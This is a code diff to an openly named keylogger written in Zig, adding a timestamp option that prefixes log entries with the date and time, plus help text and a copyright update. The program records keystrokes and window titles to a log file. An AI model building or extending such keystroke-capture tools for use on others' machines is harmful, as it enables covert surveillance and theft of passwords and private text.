@@ -6,6 +6,7 @@ const Allocator = std.mem.Allocator;
 const ArenaAllocator = std.heap.ArenaAllocator;
 const ArrayList = std.ArrayList;
 const sleep = std.Thread.sleep;
+const timestamp = std.time.timestamp;
 const eql = std.mem.eql;
 const argsAlloc = std.process.argsAlloc;
 const argsWithAllocator = std.process.argsWithAllocator;
@@ -46,6 +47,7 @@ pub fn main() !void {
     var arg_verbose: u8 = 0;
     var arg_use_date = false;
     var arg_sleep: usize = 0;
+    var arg_timestamp = false;
     while (args_iter.next()) |arg| {
         if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
             try printHeader(stdout);
@@ -66,13 +68,15 @@ pub fn main() !void {
             if (args_iter.next()) |next_arg| {
                 arg_sleep = try parseInt(usize, next_arg, 10);
             }
+        } else if (eql(u8, arg, "-t") or eql(u8, arg, "--timestamp")) {
+            arg_timestamp = true;
         }
     }
 
     if (arg_output_path.items.len == 0) {
         if (arg_use_date) {
-            const now = std.time.timestamp();
-            const localtime = cTime.localtime(&now);
+            const now_ts = timestamp();
+            const localtime = cTime.localtime(&now_ts);
 
             var output_path_b: [1024]u8 = undefined;
             const output_path_l = cTime.strftime(&output_path_b, 255, "keylogger_%Y%m%d_%H%M%S.log", localtime);
@@ -138,6 +142,17 @@ pub fn main() !void {
                 .window => {},
                 .key => try file.writeAll("\n"),
             }
+            if (arg_timestamp) {
+                const now_ts = timestamp();
+                const localtime = cTime.localtime(&now_ts);
+
+                var timestamp_b: [64]u8 = undefined;
+                const timestamp_l = cTime.strftime(&timestamp_b, timestamp_b.len, "%Y-%m-%d %H:%M:%S", localtime);
+                const timestamp_s = timestamp_b[0..timestamp_l];
+
+                try file.writeAll(timestamp_s);
+                try file.writeAll(" ");
+            }
             try file.writeAll("window: '");
             try file.writeAll(ctitle_s);
             try file.writeAll("'\n");
@@ -162,7 +177,7 @@ pub fn main() !void {
 
 fn printHeader(stdout: *Writer) !void {
     try stdout.print("Keylogger " ++ VERSION ++ "\n", .{});
-    try stdout.print("Copyright (C) 2009, 2025 Christian Mayer <https://fox21.at>\n\n", .{});
+    try stdout.print("Copyright (C) 2009, 2025, 2026 Christian Mayer <https://fox21.at>\n\n", .{});
     try stdout.flush();
 }
 
@@ -176,6 +191,7 @@ fn printHelp(stdout: *Writer) !void {
         \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
         \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
         \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
+        \\-t, --timestamp           Will stamp time in the log.
     ;
     try stdout.print(help ++ "\n", .{});
     try stdout.flush();
